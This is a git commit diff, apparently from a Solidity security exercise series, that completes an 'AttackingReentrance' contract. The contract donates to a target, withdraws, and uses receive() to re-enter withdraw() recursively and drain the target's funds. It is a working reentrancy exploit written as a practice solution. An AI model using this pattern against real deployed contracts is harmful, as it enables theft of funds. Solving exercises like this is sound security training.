3f48fc6e41c67f78b8d9e7b8d673ee6690745420
Nick Balestra-Foster <nick@balestrafoster.com>
2022-07-01 10:35:13 -0700

    6 Reentrance

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -11,5 +11,19 @@ contract AttackingReentrance {
 
     function hackContract() external {
         // Code me!
+        // A reentrancy attack occurs when a function
+        // makes an external call to another untrusted contract.
+        // Then the untrusted contract makes a recursive call back
+        // to the original function in an attempt to drain funds.
+        
+        // Donate a little
+        // Withraw it
+        Reentrance(contractAddress).donate{value: 1}(address(this));
+        Reentrance(contractAddress).withdraw();
+    }
+    receive() external payable {
+        // Reentrance during withdraw by 
+        // recursively withdraw from the contract
+        Reentrance(contractAddress).withdraw();
     }
 }
